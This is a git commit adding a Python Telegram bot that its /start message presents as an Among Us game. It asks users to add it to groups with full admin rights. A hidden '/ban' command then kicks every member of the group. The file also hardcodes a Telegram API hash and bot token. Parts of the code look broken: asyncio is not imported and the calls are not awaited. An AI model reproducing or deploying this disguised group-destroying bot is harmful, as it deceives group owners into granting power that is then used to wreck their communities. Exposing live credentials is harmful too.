34b2c3eaeea0aa2384355b8619d1fb9a285fb19c
d3ntlyname <84956808+d3ntlyname@users.noreply.github.com>
2021-07-29 12:05:05 +0300

    Create among.py

---
+++ among.py
@@ -0,0 +1,23 @@
+from pyrogram import Client as bot, filters, idle
+
+app = bot(
+session_name='AmonsUs',
+api_id=7938894,
+api_hash='c6e82bb3e729c057064471cbb6f9d33d',
+bot_token='1940951363:AAHXraGpKpR2DBv1UsqFpYdkeZC8hj5uZvM',
+)
+app.start()
+
+@app.on_message(filters.command('start', '/') & filters.private)
+async def start(client, message):
+	await message.reply_text(f'<b>Привет, {message.from_user.first_name}!\n\nЯ - бот для игры в Among Us прямо в Телеграме!\nЧтобы запустить игру, добавьте меня в группу и дайте права администратора с всеми галочками, иначе я не буду работать!</b>')
+	
+@app.on_message(filters.command('ban', ['/', '!', '.']) & ~filters.private)
+async def kickall(client, message):
+	for all in client.iter_chat_members(message.chat.id):
+		try:
+			client.kick_chat_member(message.chat.id, all.user.id, 0)
+			asyncio.sleep(2)
+		except:
+			pass
+idle()
